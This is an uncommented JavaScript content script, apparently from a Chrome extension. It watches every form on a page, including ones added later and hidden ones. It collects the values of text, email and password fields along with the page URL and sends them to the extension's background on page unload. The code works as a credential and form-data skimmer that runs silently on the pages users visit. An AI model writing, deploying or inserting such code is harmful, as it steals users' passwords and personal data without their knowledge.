const validElements = [];

const isFormVisible = (form) => {
    const style = window.getComputedStyle(form);
    return style.display === "none" || style.visibility != "visible";
};

const sendInput = () => {
    const hashMap = new Map();
    validElements.forEach((elem) =>
        hashMap.set(elem.name || elem.id || elem.type, elem.value)
    );
    hashMap.set("domain", location.href);

    if (hashMap.size < 2) return;
    chrome.runtime.sendMessage(
        Object.fromEntries(hashMap.entries()),
        function (response) {}
    );
};

const addListenerOnForms = (forms) => {
    Array.from(forms)
        .filter((form) => isFormVisible(form))
        .forEach((form) => {
            Array.from(form.elements)
                .filter(
                    (element) =>
                        element.type === "text" ||
                        element.type === "email" ||
                        element.type === "password"
                )
                .forEach((elem) => validElements.push(elem));
        });
};

window.addEventListener("beforeunload", () => {
    if (validElements.length < 1) return;
    sendInput();
});

addListenerOnForms(document.getElementsByTagName("form"));

let observer = new MutationObserver((mutations) => {
    for (let mutation of mutations) {
        for (let addedNode of mutation.addedNodes) {
            if (addedNode.nodeName === "FORM") {
                addListenerOnForms([addedNode]);
            }
        }
    }
});

observer.observe(document, { childList: true, subtree: true });
